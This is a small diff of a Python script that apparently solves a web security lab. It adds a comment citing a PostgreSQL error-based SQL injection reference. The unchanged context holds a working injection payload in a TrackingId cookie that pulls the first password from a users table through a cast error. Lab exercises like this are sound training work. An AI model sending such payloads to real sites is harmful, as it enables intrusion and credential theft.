@@ -20,6 +20,7 @@ if __name__ == "__main__":
 
     response = SESSION.get(
         f"{lab_url}/",
+        # https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based
         cookies={"TrackingId": "' AND (SELECT password FROM users LIMIT 1)::int=1 --"},
     )
 
